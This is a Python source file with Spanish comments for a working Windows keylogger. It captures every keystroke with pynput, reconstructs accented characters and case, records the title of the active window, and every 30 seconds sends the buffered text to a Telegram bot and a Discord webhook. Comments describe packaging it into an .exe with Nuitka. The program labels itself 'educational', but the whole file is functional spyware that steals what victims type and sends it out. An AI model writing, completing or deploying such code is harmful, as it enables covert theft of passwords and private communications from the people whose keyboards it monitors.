# ============================================================
#  IMPORTS
# ============================================================
import requests
from pynput import keyboard
from datetime import datetime
import threading
import time
import sys
import ctypes
import unicodedata
from ctypes import wintypes

# Importar configuración desde config.py
# Nuitka empaqueta este módulo dentro del .exe automáticamente.
try:
    import config
except ImportError:
    print("[!] Falta el archivo config.py en la misma carpeta")
    sys.exit(1)

TOKEN               = config.TG_TOKEN
CHAT_ID             = config.TG_CHAT_ID
DISCORD_WEBHOOK_URL = config.DISCORD_WEBHOOK_URL

if not TOKEN or not CHAT_ID or not DISCORD_WEBHOOK_URL:
    print("[!] config.py tiene valores vacíos")
    sys.exit(1)
    
    
#=======================================
#Extra ventana activa
#======================================
def obtener_ventana_activa():
    """Devuelve el título de la ventana en primer plano."""
    hwnd = user32.GetForegroundWindow()
    if not hwnd:
        return ""
    length = user32.GetWindowTextLengthW(hwnd)
    buf = ctypes.create_unicode_buffer(length + 1)
    user32.GetWindowTextW(hwnd, buf, length + 1)
    return buf.value


# ============================================================
# ESTADO GLOBAL
# ============================================================
buffer_teclas    = ""
lock             = threading.Lock()
parar            = threading.Event()
dead_key_pending = None


# ============================================================
#  CONSTANTES
# ============================================================
VK_SHIFT   = 0x10
VK_CAPITAL = 0x14
user32 = ctypes.windll.user32

VKS_TECLAS_MUERTAS = {0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xBA, 0xDE, 0xDB, 0xDD}

MAPA_TECLAS_MUERTAS = {
    '´': '\u0301',
    '`': '\u0300',
    '¨': '\u0308',
    '^': '\u0302',
    '~': '\u0303',
}

MAPA_ESPECIALES = {
    keyboard.Key.space:         " ",
    keyboard.Key.enter:         "\n",
    keyboard.Key.tab:           "[TAB]",
    keyboard.Key.delete:        "[DEL]",
    keyboard.Key.up:            "[↑]",
    keyboard.Key.down:          "[↓]",
    keyboard.Key.left:          "[←]",
    keyboard.Key.right:         "[→]",
    keyboard.Key.home:          "[HOME]",
    keyboard.Key.end:           "[END]",
    keyboard.Key.page_up:       "[PGUP]",
    keyboard.Key.page_down:     "[PGDN]",
    keyboard.Key.insert:        "[INS]",
    keyboard.Key.print_screen:  "[PRTSC]",
}

MODIFICADORES = {
    keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
    keyboard.Key.alt_l, keyboard.Key.alt_r,
    keyboard.Key.alt_gr, keyboard.Key.caps_lock,
    keyboard.Key.cmd, keyboard.Key.cmd_l, keyboard.Key.cmd_r,
}


# ============================================================
#  FUNCIONES AUXILIARES
# ============================================================
def obtener_estado_teclado():
    """Devuelve (shift_activo, caps_lock_activo) consultando al SO."""
    u = ctypes.windll.user32
    shift = bool(u.GetKeyState(VK_SHIFT)   & 0x8000)
    caps  = bool(u.GetKeyState(VK_CAPITAL) & 0x0001)
    return shift, caps


# ============================================================
# FUNCIONES DE ENVÍO
# ============================================================
def enviar_telegram(mensaje):
    if not mensaje.strip():
        return
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": mensaje,
            "parse_mode": "HTML"
        }
        r = requests.post(url, data=payload, timeout=10)
        if r.status_code != 200:
            print(f"[TG] Status: {r.status_code} | {r.text[:200]}")
    except Exception as e:
        print(f"[!] Error Telegram: {e}")


def enviar_discord(mensaje):
    if not mensaje.strip():
        return
    try:
        payload = {"content": mensaje}
        r = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=10)
        if r.status_code not in (200, 204):
            print(f"[DC] Status: {r.status_code} | {r.text[:200]}")
    except Exception as e:
        print(f"[!] Error Discord: {e}")


# ============================================================
# HILO DE ENVÍO
# ============================================================
def hilo_envio():
    global buffer_teclas
    while not parar.is_set():
        if parar.wait(timeout=30):
            break
        with lock:
            if not buffer_teclas:
                continue
            texto_a_enviar = buffer_teclas
            buffer_teclas = ""

        marca   = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ventana = obtener_ventana_activa()

        enviar_telegram(
            f"\n\n<b>[{marca}]</b>\n"
            f"<b>Ventana:</b> <code>{ventana}</code>\n"
            f"<code>{texto_a_enviar}</code>"
        )
        enviar_discord(
            f"[{marca}] Ventana: {ventana}\n{texto_a_enviar}"
        )


# ============================================================
# CALLBACKS DE TECLADO
# ============================================================
def on_press(key):
    global buffer_teclas, dead_key_pending

    # ESC detiene
    if key == keyboard.Key.esc:
        parar.set()
        return False

    # Backspace borra último char
    if key == keyboard.Key.backspace:
        with lock:
            if buffer_teclas:
                buffer_teclas = buffer_teclas[:-1]
        return

    # Ignorar modificadores
    if key in MODIFICADORES:
        return

    # Teclas muertas: guardar pendiente
    vk = getattr(key, 'vk', None)
    if vk in VKS_TECLAS_MUERTAS:
        try:
            dead_key_pending = key.char
        except AttributeError:
            dead_key_pending = None
        return

    # Caracteres imprimibles
    try:
        tecla = key.char
        if tecla and len(tecla) == 1:
            if dead_key_pending:
                combinante = MAPA_TECLAS_MUERTAS.get(dead_key_pending)
                if combinante:
                    tecla = unicodedata.normalize('NFC', tecla + combinante)
                dead_key_pending = None

            if tecla.isalpha():
                shift, caps = obtener_estado_teclado()
                tecla = tecla.upper() if (caps ^ shift) else tecla.lower()

            with lock:
                buffer_teclas += tecla
            return
    except AttributeError:
        pass

    # Teclas especiales
    tecla = MAPA_ESPECIALES.get(key)
    if tecla:
        with lock:
            buffer_teclas += tecla


def on_release(key):
    pass


# ============================================================
# MAIN :D
# ============================================================
if __name__ == "__main__":
    print("[*] Keylogger educativo iniciado. ESC para detener.")
    hilo = threading.Thread(target=hilo_envio, daemon=True)
    hilo.start()
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    finally:
        parar.set()
        # Enviar el último buffer antes de cerrar
        with lock:
            if buffer_teclas:
                marca = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                enviar_telegram(f"\n\n<b>[{marca}]</b>\n<code>{buffer_teclas}</code>")
                enviar_discord(f"[{marca}]\n{buffer_teclas}")
                buffer_teclas = ""
        print("[*] Programa terminado.")
